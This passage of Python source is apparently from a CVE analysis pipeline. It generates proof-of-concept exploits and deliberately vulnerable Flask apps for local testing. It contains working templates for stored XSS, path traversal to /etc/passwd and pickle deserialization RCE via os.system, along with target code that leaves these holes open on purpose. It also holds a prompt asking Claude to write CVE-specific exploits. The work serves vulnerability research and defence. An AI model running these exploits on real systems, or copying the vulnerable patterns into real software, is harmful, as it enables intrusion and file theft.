"""
import sys, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

XSS_PAYLOAD = "<script>document.cookie</script>"

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    # POST XSS payload as user input, retrieve rendered page
    r = requests.post(f"{{BASE}}/comment", json={{"text": XSS_PAYLOAD}}, timeout=10)
    page = requests.get(f"{{BASE}}/comments", timeout=10)
    return page

def verify(r):
    return XSS_PAYLOAD in r.text

if __name__ == "__main__":
    health()
    r = exploit()
    if verify(r):
        print(f"[+] EXPLOITED — raw payload reflected in response")
        sys.exit(0)
    print(f"[-] FAILED — payload not found in response")
    sys.exit(1)
''',
        '''\
#!/usr/bin/env python3
"""Minimal vulnerable target for {cve_id} — XSS
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000
"""
from flask import Flask, request, jsonify, make_response

app    = Flask(__name__)
_store = []

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/comment", methods=["POST"])
def post_comment():
    """Stores user input without sanitisation."""
    text = request.json.get("text", "")
    _store.append(text)
    return jsonify({{"stored": len(_store)}})

@app.route("/comments")
def get_comments():
    """Vulnerable: renders stored comments without HTML escaping."""
    html = "<html><body>" + "".join(f"<p>{{c}}</p>" for c in _store) + "</body></html>"
    resp = make_response(html)
    resp.headers["Content-Type"] = "text/html"
    return resp

if __name__ == "__main__":
    print("Vulnerable XSS target running on :5000")
    app.run(port=5000, debug=False)
''',
    ),
    "PathTraversal": (
        '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — Path Traversal
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
"""
import sys, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    # Classic ../ traversal to reach /etc/passwd (Linux) or win.ini (Windows)
    for path in ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"]:
        r = requests.get(f"{{BASE}}/file", params={{"name": path}}, timeout=10)
        if r.status_code == 200:
            return r
    return r

def verify(r):
    return r.status_code == 200 and ("root:" in r.text or "[fonts]" in r.text)

if __name__ == "__main__":
    health()
    r = exploit()
    if verify(r):
        print(f"[+] EXPLOITED — file read: {{r.text[:200]}}")
        sys.exit(0)
    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
    sys.exit(1)
''',
        '''\
#!/usr/bin/env python3
"""Minimal vulnerable target for {cve_id} — Path Traversal
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000
"""
from flask import Flask, request
import os

app      = Flask(__name__)
BASE_DIR = "/tmp/safe_files_{cve_safe}"
os.makedirs(BASE_DIR, exist_ok=True)

# Seed some files
with open(os.path.join(BASE_DIR, "welcome.txt"), "w") as f:
    f.write("Welcome to the file server.")

@app.route("/health")
def health():
    from flask import jsonify
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/file")
def read_file():
    """Vulnerable: joins user-supplied name to BASE_DIR without canonicalisation."""
    name = request.args.get("name", "welcome.txt")
    # VULNERABLE — no os.path.realpath() check
    path = os.path.join(BASE_DIR, name)
    try:
        with open(path) as f:
            return f.read(), 200, {{"Content-Type": "text/plain"}}
    except FileNotFoundError:
        return "not found", 404
    except PermissionError:
        return "permission denied", 403

if __name__ == "__main__":
    print("Vulnerable PathTraversal target running on :5000")
    app.run(port=5000, debug=False)
''',
    ),
    "Deserialization": (
        '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — Unsafe Deserialization (pickle RCE)
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
"""
import sys, pickle, base64, os, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

class _RCE:
    """Pickle gadget — executes a command via __reduce__."""
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned_{cve_safe}.txt",))

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    payload = base64.b64encode(pickle.dumps(_RCE())).decode()
    r = requests.post(f"{{BASE}}/load", json={{"data": payload}}, timeout=10)
    return r

def verify(r):
    return r.status_code != 500 and os.path.exists("/tmp/pwned_{cve_safe}.txt")

if __name__ == "__main__":
    health()
    r = exploit()
    if verify(r):
        print("[+] EXPLOITED — RCE via pickle gadget, see /tmp/pwned_{cve_safe}.txt")
        sys.exit(0)
    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
    sys.exit(1)
''',
        '''\
#!/usr/bin/env python3
"""Minimal vulnerable target for {cve_id} — Unsafe Deserialization
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000
"""
from flask import Flask, request, jsonify
import pickle, base64

app = Flask(__name__)

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/load", methods=["POST"])
def load_data():
    """Vulnerable: deserialises arbitrary base64-encoded pickle data."""
    raw = request.json.get("data", "")
    try:
        obj = pickle.loads(base64.b64decode(raw))   # VULNERABLE
        return jsonify({{"loaded": str(obj)}})
    except Exception as e:
        return jsonify({{"error": str(e)}}), 400

if __name__ == "__main__":
    print("Vulnerable Deserialization target running on :5000")
    app.run(port=5000, debug=False)
''',
    ),
}

# Generic fallback for UNKNOWN / unrecognised class
_POC_TEMPLATE["UNKNOWN"] = (
    '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — {vuln_class} (generic template)
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed

TODO: Fill in exploit logic specific to this CVE.
Root cause: {root_cause}
Fix summary: {fix_summary}
"""
import sys, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    # TODO: implement exploit for {cve_id}
    raise NotImplementedError("Exploit not yet implemented for {vuln_class}")

def verify(r):
    return False

if __name__ == "__main__":
    health()
    try:
        r = exploit()
        if verify(r):
            print("[+] EXPLOITED")
            sys.exit(0)
    except NotImplementedError as e:
        print(f"[!] {{e}}")
    print("[-] FAILED / NOT IMPLEMENTED")
    sys.exit(1)
''',
    '''\
#!/usr/bin/env python3
"""Minimal target app for {cve_id} — {vuln_class}
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000

TODO: Implement the vulnerability pattern specific to {cve_id}.
Root cause: {root_cause}
"""
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/test", methods=["GET", "POST"])
def test():
    """TODO: implement vulnerable endpoint for {vuln_class}."""
    return jsonify({{"message": "endpoint not yet implemented"}})

if __name__ == "__main__":
    print("Target app for {cve_id} running on :5000")
    app.run(port=5000, debug=False)
''',
)


def _render_artifact(template: str, *, cve_id: str, vuln_class: str,
                     root_cause: str, fix_summary: str) -> str:
    """Fill template placeholders."""
    cve_safe = cve_id.replace("-", "_").replace(" ", "_")
    return template.format(
        cve_id=cve_id,
        cve_safe=cve_safe,
        vuln_class=vuln_class,
        root_cause=(root_cause or "see advisory")[:200],
        fix_summary=(fix_summary or "see advisory")[:200],
    )


def generate_exploit_artifacts(
    cve_id:      str,
    advisory:    dict,
    analysis:    dict,
    probe:       dict,
    reports_dir: Path,
) -> ExploitArtifacts:
    """
    Stage 3.5 — Generate a runnable poc.py and target_app.py for this CVE.

    Strategy:
      1. Ask claude -p to write both files with full CVE context.
      2. If Claude is unavailable, fall back to class-specific templates.

    Files are saved to reports/<CVE-ID>/poc.iter1.v0.py
                                        reports/<CVE-ID>/target_app.iter1.v0.py
    """
    vuln_class  = analysis.get("vulnerability_class", "UNKNOWN")
    root_cause  = advisory.get("root_cause")  or advisory.get("raw_description") or ""
    fix_summary = analysis.get("fix_summary") or ""
    package     = advisory.get("package_name") or "unknown"
    ecosystem   = advisory.get("ecosystem")    or "unknown"
    cvss        = advisory.get("cvss_score")   or "N/A"
    cwe         = analysis.get("cwe")          or "N/A"

    out_dir = reports_dir / cve_id
    out_dir.mkdir(parents=True, exist_ok=True)

    poc_path    = out_dir / "poc.iter1.v0.py"
    target_path = out_dir / "target_app.iter1.v0.py"

    log.info("[Stage 3.5] Generating exploit artifacts for %s (%s) …", cve_id, vuln_class)

    # ── 1. Try Claude -p for AI-generated, CVE-specific code ─────────────────
    poc_code    = ""
    target_code = ""

    if _claude_available():
        prompt = f"""\
You are a security researcher writing a PoC exploit and a minimal vulnerable target \
app for a specific CVE. Follow the EXACT output format below — no preamble, no markdown.

CVE: {cve_id}
Package: {package} ({ecosystem})
CVSS: {cvss}  CWE: {cwe}
Vulnerability class: {vuln_class}
Root cause: {root_cause[:500]}
Fix summary: {fix_summary[:300]}

Output EXACTLY two sections separated by the markers shown:

===POC_START===
#!/usr/bin/env python3
\"\"\"PoC for {cve_id} — {vuln_class}
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
\"\"\"
# ... complete self-contained Python exploit following this 4-phase pattern:
# 1. health() — verify target reachable
# 2. exploit() — send malicious payload
# 3. verify(r) — check response for exploitation indicator
# 4. main block — print [+]EXPLOITED exit 0, or [-]FAILED exit 1
===POC_END===

===TARGET_START===
#!/usr/bin/env python3
\"\"\"Minimal vulnerable Flask app for {cve_id} — {vuln_class}
Run: python target_app.py   (listens on :5000)
Then: python poc.py 127.0.0.1:5000
\"\"\"
# ... minimal Flask app that demonstrates the vulnerability
# Must have: GET /health -> {{"status":"ok"}}
# Must have: at least one endpoint that replicates the vulnerable pattern
===TARGET_END===

Important rules:
- Both files must be runnable with only stdlib + requests/flask/werkzeug.
- The PoC must exit 0 on success, 1 on failure.
- Target app must listen on port 5000.
- Tailor the exploit to the SPECIFIC vulnerability class and root cause above.
- No markdown fences, no explanations outside the markers.
"""
        raw = _call_claude(prompt, timeout=180)

        if raw:
            # Extract between markers
            def _extract(text: str, start: str, end: str) -> str:
                try:
                    s = text.index(start) + len(start)
                    e = text.index(end, s)
                    return text[s:e].strip()
                except ValueError:
                    return ""

            poc_code    = _extract(raw, "===POC_START===",    "===POC_END===")
            target_code = _extract(raw, "===TARGET_START===", "===TARGET_END===")

            if poc_code and target_code:
                log.info("[Stage 3.5] AI-generated artifacts for %s", cve_id)

    # ── 2. Fallback: class-specific template ──────────────────────────────────
    # Map long-form class names (returned by the analysis stage) to _POC_TEMPLATE keys.
    _CLASS_NORM: dict[str, str] = {
        "sql injection":                    "SQLi",
        "sqli":                             "SQLi",
        "cross-site scripting":             "XSS",
        "cross-site scripting (xss)":       "XSS",
        "xss":                              "XSS",
        "os command injection":             "CMDi",
        "command injection":                "CMDi",
        "cmdi":                             "CMDi",
        "server-side request forgery":      "SSRF",
        "ssrf":                             "SSRF",
        "path traversal":                   "PathTraversal",
        "directory traversal":              "PathTraversal",
        "pathtraversal":                    "PathTraversal",
        "deserialization":                  "Deserialization",
        "insecure deserialization":         "Deserialization",
    }
    if not poc_code or not target_code:
        normalized = _CLASS_NORM.get(vuln_class.lower(), vuln_class)
        tmpl_key   = normalized if normalized in _POC_TEMPLATE else "UNKNOWN"
        poc_tmpl, target_tmpl = _POC_TEMPLATE[tmpl_key]
        kw = dict(cve_id=cve_id, vuln_class=vuln_class,
                  root_cause=root_cause, fix_summary=fix_summary)
        if not poc_code:
            poc_code    = _render_artifact(poc_tmpl,    **kw)
            log.info("[Stage 3.5] Using %s template for poc.py", tmpl_key)
        if not target_code:
            target_code = _render_artifact(target_tmpl, **kw)
            log.info("[Stage 3.5] Using %s template for target_app.py", tmpl_key)

    # ── 3. Write files ────────────────────────────────────────────────────────
    try:
        poc_path.write_text(poc_code,    encoding="utf-8")
        target_path.write_text(target_code, encoding="utf-8")
        log.info("[Stage 3.5] Artifacts written → %s/", out_dir.name)

        poc_summary = f"{vuln_class} exploit against {package} ({ecosystem})"

        return ExploitArtifacts(
            generated       = True,
            poc_path        = str(poc_path),
            target_app_path = str(target_path),
            vuln_class      = vuln_class,
            poc_summary     = poc_summary,
            iterations      = 1,
        )
    except Exception as exc:
        log.warning("[Stage 3.5] Failed to write artifacts: %s", exc)
        return ExploitArtifacts(generated=False, skip_reason=str(exc))


# ─────────────────────────────────────────────────────────────────────────────
# Tool 4 — Report assembly
# ─────────────────────────────────────────────────────────────────────────────


def compile_report(
    ctx: RunContext[PipelineDeps],
    advisory_json:  str,
    analysis_json:  str,
    ssrf_probe_json: str | None,
) -> dict:
    """
    Compile all stage results into the final PipelineReport dict.
    The agent must pass the JSON strings returned by the earlier tools.
    """
    deps = ctx.deps

    def _load(s: str | None) -> dict:
        if not s:
            return {}
        try:
            return json.loads(s) if isinstance(s, str) else s
        except json.JSONDecodeError:
            return {}

    advisory  = _load(advisory_json)
    analysis  = _load(analysis_json)
    probe     = _load(ssrf_probe_json)

    # Risk rating
    cvss  = advisory.get("cvss_score") or 0.0
    risk  = "CRITICAL" if cvss >= 9 else "HIGH" if cvss >= 7 else \
            "MEDIUM"   if cvss >= 4 else "LOW"  if cvss > 0  else "UNKNOWN"

    # One-paragraph summary
    pkg   = advisory.get("package_name",  "unknown package")
    eco   = advisory.get("ecosystem",     "unknown ecosystem")
    vcls  = analysis.get("vulnerability_class", "unknown vulnerability class")
    sev   = advisory.get("severity",      risk)
    aff   = advisory.get("affected_versions", [])
    pat   = advisory.get("patched_versions",  [])
    probe_line = ""
    if probe.get("ran"):
        probe_line = (
            f" Live SSRF probe: vulnerable mode {probe.get('vulnerable_verdict','?')}, "
            f"patched mode {probe.get('patched_verdict','?')}."
        )

    summary = (
        f"{advisory.get('cve_id', deps.cve_id)} affects {pkg} ({eco}) with a "
        f"{sev} severity {vcls} (CVSS {cvss or 'N/A'}). "
        f"Affected versions: {', '.join(aff) or 'see advisory'}. "
        f"Patched: {', '.join(pat) or 'no patch available yet'}."
        f"{probe_line}"
    )

    # Recommendations
    recommendations: list[str] = []
    if pat:
        recommendations.append(f"Upgrade to a patched version: {', '.join(pat)}.")
    if "ssrf" in vcls.lower():
        recommendations += [
            "Validate all user-supplied URLs: resolve hostname via DNS and check "
            "the resulting IP against a private-CIDR blocklist before fetching.",
            "Restrict server egress with a firewall rule — deny outbound to "
            "169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.",
            "Enable API authentication to reduce the attack surface.",
        ]
    elif "injection" in vcls.lower():
        recommendations += [
            "Use parameterised queries / safe APIs instead of string interpolation.",
            "Apply input validation and output encoding at all trust boundaries.",
        ]
    if not recommendations:
        recommendations.append("Follow the vendor's remediation guidance in the advisory.")

    report = {
        "pipeline_id":      deps.pipeline_id,
        "cve_id":           deps.cve_id,
        "generated_at":     datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "stages_completed": deps.completed,
        "stages_failed":    deps.failed,
        "advisory":         advisory  or None,
        "analysis":         analysis  or None,
        "ssrf_probe":       probe     or None,
        "overall_risk":     risk,
        "summary":          summary,
        "recommendations":  recommendations,
        "errors":           deps.errors,
    }

    log.info("[Stage 4] Report compiled — risk=%s  stages=%s", risk, deps.completed)
    deps.completed.append("4_report")
    return report


# ─────────────────────────────────────────────────────────────────────────────
# Renderers
# ─────────────────────────────────────────────────────────────────────────────

def render_text(report: PipelineReport) -> str:
    import textwrap
    sep  = "=" * 70
    sep2 = "-" * 70
    W    = 68

    def wrap(text: str, indent: int = 4) -> str:
        return textwrap.fill(text or "(none)", width=W,
                             initial_indent=" " * indent,
                             subsequent_indent=" " * indent)

    lines = [
        sep,
        "  CVE PIPELINE REPORT",
        sep,
        f"  Pipeline ID  : {report.pipeline_id}",
        f"  CVE          : {report.cve_id}",
        f"  Generated    : {report.generated_at}",
        f"  Stages done  : {', '.join(report.stages_completed)}",
        f"  Stages failed: {', '.join(report.stages_failed) or 'none'}",
        "",
        sep2,
        "  ADVISORY",
        sep2,
    ]
    if report.advisory:
        a = report.advisory
        lines += [
            f"    GHSA ID    : {a.ghsa_id}",
            f"    CVE ID     : {a.cve_id}",
            f"    Package    : {a.package_name} ({a.ecosystem})",
            f"    Severity   : {a.severity}  CVSS {a.cvss_score}",
            f"    Affected   : {', '.join(a.affected_versions) or '(see advisory)'}",
            f"    Patched    : {', '.join(a.patched_versions)  or 'none listed'}",
        ]
        if a.file_locations:
            lines.append("    Files      :")
            for fl in a.file_locations[:5]:
                loc = fl.get("file", "")
                if "line_start" in fl:
                    loc += f"  lines {fl['line_start']}"
                    if "line_end" in fl:
                        loc += f"–{fl['line_end']}"
                lines.append(f"      {loc}")
        if a.root_cause:
            lines.append("    Root cause :")
            lines.append(wrap(a.root_cause[:400], indent=6))

    lines += [
        "",
        sep2,
        "  VULNERABILITY ANALYSIS",
        sep2,
    ]
    if report.analysis:
        an = report.analysis
        lines += [
            f"    Class      : {an.vulnerability_class}",
            f"    CWE        : {an.cwe}",
            f"    Confidence : {an.confidence}",
        ]
        if an.unsafe_patterns:
            lines.append("    Unsafe patterns:")
            for p in an.unsafe_patterns[:3]:
                lines += [
                    f"      [{p.get('function_name','?')} line {p.get('lineno','?')}]",
                    f"      {p.get('code','')[:90]}",
                ]
        if an.fix_summary:
            lines.append("    Fix :")
            lines.append(wrap(an.fix_summary, indent=6))
        if an.trigger_conditions:
            lines.append("    Trigger :")
            lines.append(wrap(an.trigger_conditions, indent=6))

    lines += ["", sep2, f"  VULNERABILITY PROBE — {report.ssrf_probe.probe_type if report.ssrf_probe else 'N/A'}", sep2]
    if report.ssrf_probe:
        sp = report.ssrf_probe
        if sp.ran:
            def verd_icon(v):
                return "✓" if v and "PASS" in v else ("✗" if v and ("FAIL" in v or "EXPLOIT" in v) else "?")
            lines += [
                f"    Probe type         : {sp.probe_type}",
                f"    Vulnerable mode    : {verd_icon(sp.vulnerable_verdict)} {sp.vulnerable_verdict}",
                f"      {sp.vulnerable_detail or ''}",
                f"    Patched mode       : {verd_icon(sp.patched_verdict)} {sp.patched_verdict}",
                f"      {sp.patched_detail or ''}",
                f"    PoC payload        : {sp.poc_payload}",
                f"    Probe elapsed      : {sp.elapsed_s}s",
            ]
        else:
            lines.append(f"    Skipped — {sp.skip_reason}")

        # ── CURL TEST COMMANDS ────────────────────────────────────────────────
        if sp.curl_commands:
            lines += ["", sep2, "  CURL TEST COMMANDS", sep2]
            for line in sp.curl_commands:
                lines.append(f"    {line}")

        # ── BYPASS ANALYSIS ───────────────────────────────────────────────────
        if sp.bypass_results:
            lines += ["", sep2, "  BYPASS ANALYSIS vs PATCHED MODE", sep2]
            for i, b in enumerate(sp.bypass_results, 1):
                tested_tag = "(live test)" if b.get("tested") else "(theoretical)"
                lines += [
                    f"",
                    f"  [{i}] {b.get('name','?')}  {tested_tag}",
                    f"    Technique : {b.get('technique','')}",
                    f"    Payload   : {b.get('payload', b.get('url',''))}",
                    f"    curl      : {b.get('curl','')}",
                    f"    Result    : {b.get('verdict','')}",
                ]

    lines += ["", sep2, "  FINAL REPORT", sep2]
    lines.append(f"  Overall risk : {report.overall_risk}")
    lines.append("")
    lines.append("  Summary:")
    lines.append(wrap(report.summary, indent=4))
    lines.append("")
    lines.append("  Recommendations:")
    for i, rec in enumerate(report.recommendations, 1):
        lines.append(wrap(f"{i}. {rec}", indent=4))

    # ── Exploit artifacts (Stage 3.5) ─────────────────────────────────────────
    art = report.exploit_artifacts
    if art:
        lines += ["", sep2, "  EXPLOIT ARTIFACTS", sep2]
        if art.generated:
            lines += [
                f"  Status      : GENERATED (iter 1, v0)",
                f"  PoC         : {art.poc_path}",
                f"  Target app  : {art.target_app_path}",
                f"  Summary     : {art.poc_summary}",
                "",
                "  Usage:",
                f"    # Terminal 1 — start vulnerable target",
                f"    python \"{art.target_app_path}\"",
                f"    # Terminal 2 — run exploit",
                f"    python \"{art.poc_path}\" 127.0.0.1:5000",
            ]
        else:
            lines.append(f"  Status      : SKIPPED — {art.skip_reason}")

    if report.errors:
        lines += ["", sep2, "  ERRORS", sep2]
        for err in report.errors:
            lines.append(f"    ! {err}")

    lines.append(sep)
    return "\n".join(lines)


def render_json(report: PipelineReport) -> str:
    return report.model_dump_json(indent=2)


# ─────────────────────────────────────────────────────────────────────────────
# CLI + entry point
# ─────────────────────────────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Automated CVE analysis pipeline using pydantic-ai"
    )
    p.add_argument("cve_id",
                   help="CVE ID (CVE-2026-33626) or GHSA ID (GHSA-6w67-hwm5-92mq)")
    p.add_argument("--lab-url",   default="http://127.0.0.1:8000",
                   help="SSRF lab server URL (default: http://127.0.0.1:8000)")
    p.add_argument("--no-probe",  action="store_true",
                   help="Skip the live SSRF probe even for SSRF CVEs")
    p.add_argument("--no-cache",  action="store_true",
                   help="Ignore and bypass the file cache")
    p.add_argument("--cache-dir", default=".pipeline_cache",
                   help="Cache root directory (default: .pipeline_cache)")
    p.add_argument("--cache-ttl", type=int, default=86_400,
                   help="Cache TTL in seconds (default: 86400 = 24 h)")
    p.add_argument("--format",    choices=["text", "json"], default="text")
    p.add_argument("--out",       metavar="FILE",
                   help="Write report to file instead of stdout")
    p.add_argument("--verbose",   action="store_true")
    return p.parse_args()


async def run_pipeline(args: argparse.Namespace) -> PipelineReport:
    """
    Auto-detects the best AI backend and runs all four pipeline stages.

    Priority:
      1. ANTHROPIC_API_KEY set + pydantic_ai installed → full agent mode
      2. `claude` CLI available (Claude Code session)  → direct mode + claude -p
      3. Neither                                        → direct mode, text-only
    """
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    cve_id      = args.cve_id.strip()
    pipeline_id = str(uuid4())[:8]
    cache       = FileCache(Path(args.cache_dir), ttl_seconds=args.cache_ttl)

    deps = PipelineDeps(
        cve_id      = cve_id,
        pipeline_id = pipeline_id,
        cache       = cache,
        lab_url     = args.lab_url,
        skip_probe  = args.no_probe,
        no_cache    = args.no_cache,
    )

    api_key = os.environ.get("ANTHROPIC_API_KEY", "")

    if api_key and _PYDANTIC_AI:
        log.info("Pipeline %s  cve=%s  mode=agent(pydantic-ai)", pipeline_id, cve_id)
        return await _run_pipeline_agent(deps, api_key)
    else:
        mode = "claude-cli" if _claude_available() else "text-only"
        log.info("Pipeline %s  cve=%s  mode=%s  (no ANTHROPIC_API_KEY needed)",
                 pipeline_id, cve_id, mode)
        return await _run_pipeline_direct(deps)


async def _run_pipeline_agent(deps: PipelineDeps, api_key: str) -> PipelineReport:
    """Full pydantic-ai agent path (requires ANTHROPIC_API_KEY)."""
    agent = _make_agent(api_key)
    user_prompt = (
        f"Analyse {deps.cve_id}. "
        "Call fetch_advisory first, then analyze_vulnerability (it will "
        "automatically fetch real code from GitHub if a commit reference exists). "
        "Then call run_vuln_probe with the vulnerability_class detected in Step 2 — "
        "it will automatically pick the right probe (SSRF, SQLi, XSS, path traversal, etc.). "
        "Finally call compile_report. Return the complete PipelineReport."
    )
    result = await agent.run(user_prompt, deps=deps)
    return result.data


async def _run_pipeline_direct(deps: PipelineDeps) -> PipelineReport:
    """
    Direct sequential mode — no pydantic-ai agent required.
    Stages 1-4 are called in order. Claude Code CLI (`claude -p`) is used
    to enhance the summary and recommendations if available.
    """
    ctx = _DirectCtx(deps)  # plain wrapper — never touches pydantic_ai internals

    # ── Stage 1: fetch advisory ───────────────────────────────────────────────
    advisory = fetch_advisory(ctx, deps.cve_id)

    # ── Stage 2: analyse vulnerability ───────────────────────────────────────
    analysis = analyze_vulnerability(ctx, json.dumps(advisory))

    # ── Stage 3: probe ────────────────────────────────────────────────────────
    vuln_class   = analysis.get("vulnerability_class", "UNKNOWN")
    diff_summary = analysis.get("diff_summary", {})
    code_before  = diff_summary.get("code_before", "") if isinstance(diff_summary, dict) else ""
    code_after   = diff_summary.get("code_after",  "") if isinstance(diff_summary, dict) else ""
    probe = run_vuln_probe(ctx, vuln_class, code_before, code_after)

    # ── Stage 3.5: generate exploit artifacts (poc.py + target_app.py) ───────
    reports_dir = deps.cache.root.parent / "reports"
    artifacts = ExploitArtifacts(generated=False, skip_reason="not run")
    try:
        artifacts = generate_exploit_artifacts(
            cve_id      = deps.cve_id,
            advisory    = advisory,
            analysis    = analysis,
            probe       = probe,
            reports_dir = reports_dir,
        )
        deps.completed.append("3.5_artifacts")
    except Exception as exc:
        log.warning("[Stage 3.5] Error: %s", exc)
        deps.failed.append("3.5_artifacts")

    # ── Stage 4: compile report ───────────────────────────────────────────────
    report_dict = compile_report(
        ctx,
        json.dumps(advisory),
        json.dumps(analysis),
        json.dumps(probe),
    )

    # ── Optional: enhance summary + recommendations with claude -p ────────────
    try:
        synopsis = (
            f"CVE: {deps.cve_id}\n"
            f"Package: {advisory.get('package_name')} ({advisory.get('ecosystem')})\n"
            f"Severity: {advisory.get('severity')}  CVSS: {advisory.get('cvss_score')}\n"
            f"Vuln class: {vuln_class}\n"
            f"Description: {advisory.get('raw_description', '')[:800]}\n"
            f"Fix summary: {analysis.get('fix_summary', '')[:400]}\n"
            f"Probe result: confirmed={probe.get('confirmed')}  "
            f"poc={probe.get('poc_payload', '')}\n"
        )
        claude_summary = _call_claude(
            f"You are a security analyst. Write a concise 3-sentence executive summary "
            f"for this CVE finding, then on a new line starting with 'RECOMMENDATIONS:' "
            f"list 3 bullet-point remediation steps.\n\n{synopsis}",
            timeout=90,
        )
        if claude_summary:
            # Split into summary vs recommendations
            if "RECOMMENDATIONS:" in claude_summary:
                parts = claude_summary.split("RECOMMENDATIONS:", 1)
                report_dict["summary"] = parts[0].strip()
                recs = [r.strip().lstrip("•-* ") for r in parts[1].strip().splitlines()
                        if r.strip()]
                if recs:
                    report_dict["recommendations"] = recs
            else:
                report_dict["summary"] = claude_summary
            log.info("[AI] Summary enhanced via claude -p")
    except Exception as exc:
        log.debug("claude -p enhancement skipped: %s", exc)

    # ── Build PipelineReport from the compiled dict ───────────────────────────
    def _sub(model, data: dict):
        """Safely construct a pydantic model, ignoring unknown keys.

        Coerces None → field default for str fields so cached null values
        (e.g. fix_summary: null) don't raise pydantic validation errors.
        """
        valid = {}
        for k, v in data.items():
            if k not in model.model_fields:
                continue
            if v is None:
                field_info = model.model_fields[k]
                # Use the field's default if it is a plain value (not a factory)
                default = field_info.default
                if default is not None and not callable(default):
                    v = default
            valid[k] = v
        return model(**valid)

    advisory_obj  = _sub(AdvisoryResult,     advisory)  if advisory  else None
    analysis_obj  = _sub(VulnAnalysisResult, analysis)  if analysis  else None
    probe_obj     = _sub(SSRFProbeResult,    probe)      if probe     else None

    _final_report = PipelineReport(
        pipeline_id      = report_dict.get("pipeline_id",      deps.pipeline_id),
        cve_id           = report_dict.get("cve_id",           deps.cve_id),
        generated_at     = report_dict.get("generated_at",
                               datetime.now(timezone.utc).isoformat(timespec="seconds")),
        stages_completed = report_dict.get("stages_completed", deps.completed),
        stages_failed    = report_dict.get("stages_failed",    deps.failed),
        advisory         = advisory_obj,
        analysis         = analysis_obj,
        ssrf_probe       = probe_obj,
        exploit_artifacts = artifacts,
        overall_risk     = report_dict.get("overall_risk",     "UNKNOWN"),
        summary          = report_dict.get("summary",          ""),
        recommendations  = report_dict.get("recommendations",  []),
        errors           = report_dict.get("errors",           deps.errors),
    )
    # Auto-ingest into Obsidian vault (silent on failure)
    obsidian_ingest(_final_report.cve_id, _final_report)
    return _final_report


# ── Obsidian vault auto-ingest ────────────────────────────────────────────────

_VAULT_PATH = Path(os.environ.get(
    "OBSIDIAN_VAULT",
    r"C:\Users\dheer\obsidian-vault"
))
_CVE_WIKI = _VAULT_PATH / "wiki" / "domains" / "cve-automation"


def obsidian_ingest(cve_id: str, report: "PipelineReport", vault_path: Path | None = None) -> None:
    """
    After a CVE pipeline run, append a row to the processed-cves wiki page
    and create/update a dedicated wiki page for the CVE.

    Silent on any error — the pipeline must not fail because of wiki I/O.
    """
    try:
        vp = vault_path or _VAULT_PATH
        cve_wiki = vp / "wiki" / "domains" / "cve-automation"
        cve_wiki.mkdir(parents=True, exist_ok=True)

        # ── 1. Append row to processed-cves.md ───────────────────────────────
        processed_path = cve_wiki / "processed-cves.md"
        adv = report.advisory
        ana = report.analysis
        prb = report.ssrf_probe

        severity = adv.severity or "N/A" if adv else "N/A"
        cvss     = str(adv.cvss_score) if adv and adv.cvss_score else "N/A"
        vuln_cls = ana.vulnerability_class if ana else "UNKNOWN"
        risk     = report.overall_risk or "N/A"
        desc     = (adv.root_cause or "")[:80].replace("|", "/").replace("\n", " ") if adv else "N/A"

        row = f"| {cve_id} | {severity} | {cvss} | {vuln_cls} | {risk} | {desc} |\n"

        if processed_path.exists():
            content = processed_path.read_text(encoding="utf-8")
            # Avoid duplicate rows
            if cve_id not in content:
                # Insert row after the header separator line of the table
                lines = content.splitlines(keepends=True)
                # Find the line starting with "| CVE-" or after the "| ---" separator
                insert_at = len(lines)
                for i, line in enumerate(lines):
                    if line.startswith("| ---") or line.startswith("|---"):
                        insert_at = i + 1
                        break
                lines.insert(insert_at, row)
                processed_path.write_text("".join(lines), encoding="utf-8")
        else:
            # Create minimal file if missing
            processed_path.write_text(
                "---\ntype: log\ntitle: Processed CVEs\nupdated: " +
                datetime.now(timezone.utc).strftime("%Y-%m-%d") + "\n---\n\n" +
                "# Processed CVEs\n\n" +
                "| CVE ID | Severity | CVSS | Vuln Class | Risk | Summary |\n" +
                "| ------ | -------- | ---- | ---------- | ---- | ------- |\n" +
                row,
                encoding="utf-8"
            )

        # ── 2. Write a dedicated wiki page for this CVE ───────────────────────
